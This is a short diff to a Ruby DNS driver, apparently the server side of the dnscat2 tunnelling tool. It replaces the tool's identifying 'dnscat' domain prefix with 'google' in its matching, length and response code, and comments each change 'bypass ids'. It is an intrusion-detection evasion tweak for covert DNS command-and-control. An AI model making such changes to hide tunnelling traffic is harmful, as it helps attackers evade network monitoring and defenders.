@@ -23,6 +23,7 @@ class DriverDNS
   # Experimentally determined to work
   MAX_A_RECORDS = 64
   MAX_AAAA_RECORDS = 16
+  MY_FLAG_STRING = 'google'
 
   RECORD_TYPES = {
     DNSer::Packet::TYPE_TXT => {
@@ -115,7 +116,8 @@ class DriverDNS
 
     # Check if it starts with dnscat, which is used when
     # the server is unknown
-    if(name =~ /^dnscat\.(.*)$/i)
+    # bypass ids
+    if(name =~ /^google\.(.*)$/i)
       return $1, nil
     end
 
@@ -195,7 +197,8 @@ class DriverDNS
     # Figure out the length of the domain based on the record type
     if(type_info[:requires_domain])
       if(domain.nil?)
-        domain_length = ("dnscat.").length
+        # bypass ids
+        domain_length = ("google.").length
       else
         domain_length = domain.length + 1 # +1 for the dot
       end
@@ -228,7 +231,8 @@ class DriverDNS
     # Append domain, if needed
     if(type_info[:requires_domain])
       if(domain.nil?)
-        response = (response == "" ? "dnsCat" : ("dnsCat." + response))
+        # bypass ids
+        response = (response == "" ? "google" : ("google." + response))
       else
         response = (response == "" ? domain : (response + "." + domain))
       end
